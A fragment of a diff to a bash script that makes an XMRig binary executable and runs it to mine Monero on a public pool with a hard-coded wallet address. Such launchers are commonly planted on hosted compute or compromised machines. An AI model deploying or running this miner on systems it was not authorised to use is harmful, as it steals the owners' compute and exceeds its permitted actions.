@@ -1,5 +1,5 @@
 #!/bin/bash
-
+chmod +x xmrig
 ! ./xmrig --coin 'XMR' -o pool.supportxmr.com:5555 -u 47sPa3gqZR8UVxst5P2k15TzUatq7qHdrHshf5sCxnVUQMUmERdDp6XQ87priFXYcAKttq1tkReaYgSMz2fEksQZ93n1HPV  -p xn
 
  done 
